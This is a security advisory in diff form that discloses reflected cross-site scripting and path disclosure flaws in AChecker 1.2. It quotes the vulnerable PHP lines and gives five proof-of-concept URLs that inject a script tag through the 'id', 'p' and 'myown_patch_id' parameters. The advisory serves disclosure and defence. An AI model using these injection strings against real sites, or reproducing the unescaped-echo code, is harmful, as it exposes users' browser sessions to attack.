@@ -1,0 +1,138 @@
+
+AChecker 1.2 Multiple Remote XSS/PD Vulnerabilities
+
+
+Vendor: ATutor (Inclusive Design Institute)
+Product web page: http://www.atutor.ca
+Affected version: 1.2 (build r530)
+
+Summary: AChecker is an open source Web accessibility evaluation tool.
+It can be used to review the accessibility of Web pages based on a variety
+international accessibility guidelines.
+
+Desc: AChecker suffers from multiple cross-site scripting and path disclosure
+vulnerabilities. Input thru the GET parameters 'id', 'p' and 'myown_patch_id'
+in several scripts is not sanitized allowing the attacker to execute HTML code
+into user's browser session on the affected site and/or disclose the full path
+of application's residence ;].
+
+
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+
+- Parameter: id
+- Type: GET
+- Script: language_add_edit.tmpl.php
+- Vulnerable code:
+----------------------------------------------------
+/themes/default/language/language_add_edit.tmpl.php:
+----------------------------------------------------
+
+Line 20: <form name="input_form" method="post" action="<?php echo $_SERVER['PHP_SELF']; ?><?php if (isset($_GET["id"])) echo '?id='.$_GET["id"]; ?>" >
+
+----------------------------------------------------
+
+- PoC: http://localhost/themes/default/language/language_add_edit.tmpl.php?id=210"><script>alert('zsl')</script>
+
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+
+- Parameter: p
+- Type: GET
+- Script: frame_header.php
+- Vulnerable code:
+----------------------------------------------------
+/documentation/frame_header.php:
+----------------------------------------------------
+
+Line 17: if (isset($_GET['p'])) {
+Line 18:         $this_page = htmlentities($_GET['p']);
+Line 19: } else {
+Line 20:         exit;
+Line 21: }
+
+----------------------------------------------------
+
+- PoC: http://localhost/documentation/frame_header.php?p="><script>alert('zsl')</script>
+
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+
+- Parameter: id
+- Type: GET
+- Script: user_group_create_edit.tmpl.php
+- Vulnerable code:
+----------------------------------------------------
+/themes/default/user/user_group_create_edit.tmpl.php:
+----------------------------------------------------
+
+Line 20: <form name="input_form" method="post" action="<?php echo $_SERVER['PHP_SELF']; ?><?php if (isset($_GET["id"])) echo '?id='.$_GET["id"]; ?>" >
+
+----------------------------------------------------
+
+- PoC: http://localhost/themes/default/user/user_group_create_edit.tmpl.php?id=188"><script>alert('zsl')</script>
+
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+
+- Parameter: myown_patch_id
+- Type: GET
+- Script: patch_edit.php
+- Vulnerable code:
+----------------------------------------------------
+/updater/patch_edit.php:
+----------------------------------------------------
+
+Line 20: if (!isset($_REQUEST["myown_patch_id"]))
+Line 21: {
+Line 22:         $msg->addError('NO_ITEM_SELECTED');
+Line 23:         exit;
+Line 24: }
+Line 25: 
+Line 26: $myown_patch_id = $_REQUEST["myown_patch_id"];
+
+----------------------------------------------------
+
+- PoC: http://localhost/updater/patch_edit.php?lang=144&myown_patch_id=144"><script>alert('zsl')</script>
+
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+
+- Parameter: id
+- Type: GET
+- Script: user_create_edit.php
+- Vulnerable code:
+----------------------------------------------------
+/user/user_create_edit.php:
+----------------------------------------------------
+
+Line 103: if (isset($_GET['id'])) // edit existing user
+Line 104: {
+Line 105:         $usersDAO = new UsersDAO();
+Line 106:         $savant->assign('user_row', $usersDAO->getUserByID($_GET['id']));
+Line 107:         $savant->assign('show_password', false);
+Line 108: 
+Line 109: }
+
+----------------------------------------------------
+
+- PoC: http://localhost/user/user_create_edit.php?id=78"><script>alert('zsl')</script>
+
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+
+
+
+Tested on: Microsoft Windows XP Professional SP3 (EN)
+           Apache 2.2.14 (Win32)
+           PHP 5.3.1
+           MySQL 5.1.41
+
+
+Vulnerabilities discovered by Gjoko 'LiquidWorm' Krstic
+                              liquidworm gmail com
+                              Zero Science Lab - http://www.zeroscience.mk
+
+
+Advisory ID: ZSL-2011-5035
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2011-5035.php
+
+
+01.08.2011
+
+
+t00t!
